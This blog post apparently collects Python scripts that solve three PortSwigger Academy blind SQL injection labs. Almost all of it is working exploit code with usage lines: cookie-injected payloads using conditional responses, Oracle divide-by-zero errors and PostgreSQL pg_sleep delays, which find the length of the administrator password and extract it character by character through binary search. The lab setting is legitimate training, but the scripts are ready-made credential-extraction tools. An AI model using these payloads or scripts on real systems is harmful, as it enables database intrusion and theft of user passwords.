---

layout: post
title: "PortSwigger Labs python Scripts"
date: 2026-01-02 08:00 +0530
categories: [PortSwigger Labs]
tags: [PortSwigger Labs]

---

## First run this common commands to run any of the below scripts :-
```python

pip install aiohttp
pip install requests
```

# Lab 11 : Blind SQL injection with conditional responses

![image](https://media.licdn.com/dms/image/v2/D4D12AQGgucNNwQWACg/article-cover_image-shrink_423_752/article-cover_image-shrink_423_752/0/1721226873959?e=1769040000&v=beta&t=0OIYZ8z3uVsl976KPxzRHt3DNiepXqNnb97OmuaCco4)

---

## Script for 11 Lab :- 

```python
import asyncio
import aiohttp
import argparse
import sys
import urllib.parse
import time

# Styling for the terminal
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
B = "\033[94m"  # Blue
R = "\033[91m"  # Red
E = "\033[0m"   # Reset

class PortSwiggerExploiter:
    def __init__(self, url, tracking_id, session, success_str):
        self.url = url
        self.tracking_id = tracking_id
        self.session = session
        self.success_str = success_str
        self.password = []

    async def make_request(self, session, payload):
        """Sends the request and checks for the success string."""
        # PortSwigger labs often require specific encoding for SQL characters in cookies
        full_cookie = f"TrackingId={self.tracking_id}{payload}; session={self.session}"
        headers = {"Cookie": full_cookie}
        
        try:
            async with session.get(self.url, headers=headers, timeout=10) as resp:
                text = await resp.text()
                return self.success_str in text
        except Exception as e:
            return False

    async def sanity_check(self, session):
        """Ensures the success string and SQL logic are actually working."""
        print(f"{B}[*] Verifying success string: \"{self.success_str}\"{E}")
        
        # Test 1: Forced True
        true_payload = "' AND 1=1--"
        # Test 2: Forced False
        false_payload = "' AND 1=2--"
        
        check_true = await self.make_request(session, true_payload)
        check_false = await self.make_request(session, false_payload)
        
        if check_true and not check_false:
            print(f"{G}[+] Sanity check passed! Vulnerability confirmed.{E}")
            return True
        else:
            print(f"{R}[!] ERROR: Sanity check failed.{E}")
            print(f"    When 1=1, found string: {check_true}")
            print(f"    When 1=2, found string: {check_false}")
            print(f"    Check if \"{self.success_str}\" is exactly what you see in the browser.")
            return False

    async def find_length(self, session):
        """Detects length of the admin password."""
        print(f"{B}[*] Detecting password length...{E}")
        for i in range(1, 50):
            payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={i})='a"
            if await self.make_request(session, payload):
                return i
        return 20 # Fallback

    async def extract_char(self, session, pos, total_len):
        """Binary search for a single character."""
        low = 32   # Space
        high = 126 # ~
        best_match = 32

        while low <= high:
            mid = (low + high) // 2
            # SQL for PostgreSQL/Standard
            payload = f"' AND (SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator')>{mid}--"
            
            if await self.make_request(session, payload):
                low = mid + 1
                best_match = low
            else:
                high = mid - 1
                best_match = mid
        
        self.password[pos-1] = chr(best_match)
        # Display progress
        current_str = "".join(self.password)
        print(f"\r{Y}[+] Extracting: {G}{current_str.ljust(total_len)}{E}", end="")

    async def start(self):
        # We limit concurrency to 10 to keep the lab server from crashing/blocking us
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            
            if not await self.sanity_check(session):
                return

            length = await self.find_length(session)
            print(f"{B}[+] Length detected: {length}{E}")
            
            self.password = ["."] * length
            
            print(f"{B}[*] Launching Asynchronous Binary Search...{E}")
            tasks = [self.extract_char(session, i, length) for i in range(1, length + 1)]
            await asyncio.gather(*tasks)
            
            final_pw = "".join(self.password)
            print(f"\n\n{G}[SUCCESS] Password: {final_pw}{E}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Lab URL")
    parser.add_argument("-s", "--session", required=True, help="Session Cookie")
    parser.add_argument("-t", "--tracking", required=True, help="TrackingId Cookie")
    # Updated default to include the exclamation mark
    parser.add_argument("--string", default="Welcome back!", help="The success message")
    
    args = parser.parse_args()

    start_time = time.time()
    
    # Run the async loop
    engine = PortSwiggerExploiter(args.url, args.tracking, args.session, args.string)
    asyncio.run(engine.start())
    
    print(f"\n{B}[*] Finished in {round(time.time() - start_time, 2)} seconds.{E}")
```

Usage :- 

```bash
python3 sqli_solve.py -u "https://YOUR-LAB-ID.web-security-academy.net/" -s "YOUR_SESSION_COOKIE" -t "YOUR_TRACKING_ID"
```

Example of Usage :- 

```bash
python3 script.py -u https://0ad5007504fa10d580c172e8002d00b2.web-security-academy.net/ -s Jz3Qam8ANeAtnEXXYaFMfT0ZJVldUDYe -t dsk4eAVjoDy0Tzay
```

---

# Lab 12 : Blind SQL injection with conditional errors

![image](https://media.licdn.com/dms/image/v2/D4D12AQGgucNNwQWACg/article-cover_image-shrink_423_752/article-cover_image-shrink_423_752/0/1721226873959?e=1769040000&v=beta&t=0OIYZ8z3uVsl976KPxzRHt3DNiepXqNnb97OmuaCco4)


## Script for 12 Lab :- 

```python
import asyncio
import aiohttp
import argparse
import sys
import time

# Styling
G = "\033[92m" # Green
Y = "\033[93m" # Yellow
B = "\033[94m" # Blue
R = "\033[91m" # Red
E = "\033[0m"  # Reset

class OracleErrorExploiter:
    def __init__(self, url, tracking_id, session):
        self.url = url
        self.tracking_id = tracking_id
        self.session = session
        self.password = []

    async def check(self, session, condition):
        """
        Oracle Error Logic: 
        If condition is TRUE -> 1/0 triggers (Internal Server Error 500)
        If condition is FALSE -> Returns NULL (Success 200)
        """
        # Precise Oracle syntax from the video
        payload = f"'||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'"
        
        cookie_header = f"TrackingId={self.tracking_id}{payload}; session={self.session}"
        headers = {"Cookie": cookie_header}
        
        try:
            async with session.get(self.url, headers=headers, timeout=15) as resp:
                # 500 means the condition was TRUE
                return resp.status == 500
        except Exception:
            return False

    async def sanity_check(self, session):
        print(f"{B}[*] Verifying Error-Trigger logic...{E}")
        # Test 1: This MUST return 500
        is_true = await self.check(session, "1=1")
        # Test 2: This MUST return 200
        is_false = await self.check(session, "1=2")
        
        if is_true and not is_false:
            print(f"{G}[+] Logic confirmed: 500 = TRUE, 200 = FALSE.{E}")
            return True
        else:
            print(f"{R}[!] Logic Failure! Check if your session/tracking cookies are still valid.{E}")
            print(f"    (True Test: {is_true}, False Test: {is_false})")
            return False

    async def get_length(self, session):
        print(f"{B}[*] Finding password length...{E}")
        for i in range(1, 31):
            if await self.check(session, f"LENGTH(password)={i}"):
                print(f"{G}[+] Length detected: {i}{E}")
                return i
        return 20

    async def extract_char(self, session, pos, length):
        """Binary search with a final confirmation check for 100% accuracy."""
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            # Ask: Is the ASCII value > mid?
            if await self.check(session, f"ASCII(SUBSTR(password,{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        
        # Binary search result is 'low'
        candidate = chr(low)
        
        # --- THE VERIFICATION STEP ---
        # Before accepting, confirm: Does SUBSTR(password, pos, 1) actually equal candidate?
        # This prevents the "O" glitch you experienced.
        if await self.check(session, f"SUBSTR(password,{pos},1)='{candidate}'"):
            self.password[pos-1] = candidate
        else:
            # If verification fails, try a small linear scan around the area or mark as error
            self.password[pos-1] = "?" 
            
        current = "".join(self.password)
        print(f"\r{Y}[+] Extraction Progress: {G}{current.ljust(length)}{E}", end="")

    async def run(self):
        # Increased timeout and lowered concurrency for Oracle stability
        connector = aiohttp.TCPConnector(limit=3) 
        async with aiohttp.ClientSession(connector=connector) as session:
            if not await self.sanity_check(session):
                return

            length = await self.get_length(session)
            self.password = ["."] * length
            
            print(f"{B}[*] Running Verified Binary Search...{E}")
            # We run them in batches or sequentially to ensure the server doesn't get overwhelmed
            for i in range(1, length + 1):
                await self.extract_char(session, i, length)
            
            final_pw = "".join(self.password)
            print(f"\n\n{G}[SUCCESS] Administrator Password: {final_pw}{E}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-s", "--session", required=True)
    parser.add_argument("-t", "--tracking", required=True)
    args = parser.parse_args()

    start = time.time()
    exploiter = OracleErrorExploiter(args.url, args.tracking, args.session)
    asyncio.run(exploiter.run())
    print(f"\n{B}[*] Done in {round(time.time() - start, 2)}s{E}")
```

Usage :- 

```bash
python3 sqli_solve.py -u "https://YOUR-LAB-ID.web-security-academy.net/" -s "YOUR_SESSION_COOKIE" -t "YOUR_TRACKING_ID"
```

Example of Usage :- 

```bash
python3 script.py -u https://0ad5007504fa10d580c172e8002d00b2.web-security-academy.net/ -s Jz3Qam8ANeAtnEXXYaFMfT0ZJVldUDYe -t dsk4eAVjoDy0Tzay
```

---


# Lab 15 : Blind SQL injection with time delays and information retrieval

![image](https://media.licdn.com/dms/image/v2/D4D12AQGgucNNwQWACg/article-cover_image-shrink_423_752/article-cover_image-shrink_423_752/0/1721226873959?e=1769040000&v=beta&t=0OIYZ8z3uVsl976KPxzRHt3DNiepXqNnb97OmuaCco4)

## Script for Lab 15 :- 

```python
import asyncio
import aiohttp
import argparse
import sys
import time

# Styling
G = "\033[92m" # Green
Y = "\033[93m" # Yellow
B = "\033[94m" # Blue
R = "\033[91m" # Red
E = "\033[0m"  # Reset

class TimeBasedExploiter:
    def __init__(self, url, tracking_id, session, delay=3):
        self.url = url
        self.tracking_id = tracking_id
        self.session = session
        self.delay = delay # The "Sleep" time
        self.password = []

    async def check(self, session, condition):
        """
        PostgreSQL Time Logic:
        If condition is TRUE -> pg_sleep(3) is called.
        If condition is FALSE -> Returns instantly.
        """
        # Payload using CASE for PostgreSQL
        payload = f" '||(SELECT CASE WHEN ({condition}) THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
        
        cookie_header = f"TrackingId={self.tracking_id}{payload}; session={self.session}"
        headers = {"Cookie": cookie_header}
        
        start_time = time.time()
        try:
            # We set a timeout slightly higher than our delay
            async with session.get(self.url, headers=headers, timeout=self.delay + 5) as resp:
                duration = time.time() - start_time
                # If the request took longer than our delay, it's TRUE
                return duration >= self.delay
        except Exception:
            # If it timeouts, it likely slept, so we count it as TRUE
            return True

    async def sanity_check(self, session):
        print(f"{B}[*] Performing Time-Delay Sanity Check ({self.delay}s)...{E}")
        print(f"{Y}[!] Note: This will take at least {self.delay} seconds.{E}")
        
        # Test 1: Forced True (Should sleep)
        is_true = await self.check(session, "1=1")
        if is_true:
            print(f"{G}[+] Sanity Check Passed: Server is vulnerable to time delays.{E}")
            return True
        else:
            print(f"{R}[!] Sanity Check Failed: Server did not sleep. Check cookies/URL.{E}")
            return False

    async def get_length(self, session):
        print(f"{B}[*] Determining password length...{E}")
        for i in range(1, 31):
            if await self.check(session, f"LENGTH(password)={i}"):
                print(f"{G}[+] Length detected: {i}{E}")
                return i
        return 20

    async def extract_char(self, session, pos, length):
        """
        For Time-Based, we use Binary Search carefully.
        We do NOT run these in parallel because one sleep blocks the session.
        """
        low = 32
        high = 126
        
        while low <= high:
            mid = (low + high) // 2
            # Condition: Is ASCII value > mid?
            if await self.check(session, f"ASCII(SUBSTR(password,{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        
        candidate = chr(low)
        self.password[pos-1] = candidate
        current = "".join(self.password)
        print(f"\r{Y}[+] Password Progress: {G}{current.ljust(length)}{E}", end="")

    async def run(self):
        # IMPORTANT: For Time-based, we use limit=1. 
        # Parallel requests on the same session will mess up the timing.
        connector = aiohttp.TCPConnector(limit=1) 
        async with aiohttp.ClientSession(connector=connector) as session:
            if not await self.sanity_check(session):
                return

            length = await self.get_length(session)
            self.password = ["."] * length
            
            print(f"{B}[*] Starting Character Extraction (Sequential Binary Search)...{E}")
            for i in range(1, length + 1):
                await self.extract_char(session, i, length)
            
            print(f"\n\n{G}[SUCCESS] Final Password: {''.join(self.password)}{E}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-s", "--session", required=True)
    parser.add_argument("-t", "--tracking", required=True)
    parser.add_argument("-d", "--delay", type=int, default=3, help="Seconds to sleep")
    args = parser.parse_args()

    start = time.time()
    exploiter = TimeBasedExploiter(args.url, args.tracking, args.session, args.delay)
    asyncio.run(exploiter.run())
    print(f"\n{B}[*] Total Execution Time: {round(time.time() - start, 2)}s{E}")
```

Usage :- 

```bash
python3 sqli_solve.py -u "https://YOUR-LAB-ID.web-security-academy.net/" -s "YOUR_SESSION_COOKIE" -t "YOUR_TRACKING_ID"
```

Example of Usage :- 

```bash
python3 script.py -u https://0ad5007504fa10d580c172e8002d00b2.web-security-academy.net/ -s Jz3Qam8ANeAtnEXXYaFMfT0ZJVldUDYe -t dsk4eAVjoDy0Tzay
```


